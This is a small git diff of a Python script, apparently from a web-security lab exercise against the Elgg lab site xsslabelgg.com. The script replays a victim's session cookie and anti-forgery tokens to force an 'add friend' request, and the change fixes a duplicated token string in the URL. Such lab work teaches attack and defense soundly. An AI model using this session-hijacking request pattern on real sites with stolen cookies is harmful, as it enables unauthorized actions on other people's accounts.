@@ -3,7 +3,7 @@ import sys
 import requests
 
 def main(cookie, ts, token):
-	url = "http://www.xsslabelgg.com/action/friends/add?friend=44" + "&__elgg_ts={0}&__elgg_token={1}".format(ts, token)*2
+	url = "http://www.xsslabelgg.com/action/friends/add?friend=44&__elgg_ts={0}&__elgg_token={1}".format(ts, token)
 	headers = {
 		"Accept": "application/json, text/javascript, */*; q=0.01",
 	        "Cookie": "Elgg={0}".format(cookie),
